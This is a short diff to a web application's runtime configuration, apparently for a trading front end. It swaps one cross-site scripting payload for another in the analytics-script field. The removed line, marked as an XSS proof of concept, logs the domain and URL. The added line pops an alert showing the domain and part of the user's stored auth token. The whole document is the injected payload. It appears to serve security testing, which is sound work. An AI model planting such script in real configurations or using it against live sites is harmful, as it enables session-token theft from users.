@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>top.__xss={d:document.domain,u:location.href,t:Date.now()};console.log('[XSS-POC]',top.__xss)</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>alert('XSS at '+document.domain+'\\nToken: '+(localStorage.auth_token||'').slice(0,20))</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
